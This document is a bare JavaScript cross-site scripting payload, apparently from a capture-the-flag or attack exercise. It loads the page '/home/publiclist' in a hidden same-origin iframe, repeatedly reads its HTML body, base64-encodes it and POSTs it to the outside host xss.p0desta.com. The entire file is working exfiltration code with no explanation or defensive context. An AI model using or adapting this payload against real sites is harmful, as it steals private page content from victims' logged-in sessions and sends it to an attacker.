function send(e) {
    var t = new XMLHttpRequest;
    t.open("POST", "https://xss.p0desta.com", !0), t.setRequestHeader("Content-type", "text/plain"), t.onreadystatechange = function() {
        4 == t.readyState && t.status
    }, t.send(e)
}
var iframe = document.createElement("iframe");
iframe.src = "/home/publiclist";
document.body.appendChild(iframe);
iframe.onload = setInterval(function() {
    var c = encodeURI(document.getElementsByTagName("iframe")[0].contentWindow.document.getElementsByTagName("body")[0].innerHTML);
    send(btoa(c));
}, 2)